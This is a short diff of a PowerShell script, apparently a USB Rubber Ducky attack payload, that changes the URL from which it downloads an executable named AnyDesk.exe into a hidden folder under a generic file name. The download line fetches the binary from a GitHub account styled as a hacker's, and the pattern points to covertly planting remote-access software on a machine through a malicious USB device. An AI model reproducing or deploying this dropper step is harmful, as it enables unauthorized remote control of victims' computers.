@@ -15,7 +15,7 @@ if (-not (Test-Path -Path $hiddenFolder)) {
 }
 
 # URL of the file to be downloaded (replace with the actual file URL)
-$fileUrl = "https://raw.githubusercontent.com/Darkhaxxor005/usbrubberducky-payloads/refs/heads/master/AnyDesk.exe"
+$fileUrl = "https://raw.githubusercontent.com/Darkhaxxor005/host/refs/heads/main/AnyDesk.exe"
 
 # Define the destination file path in the hidden folder
 $destinationFile = Join-Path $hiddenFolder "downloadedFile.exe"
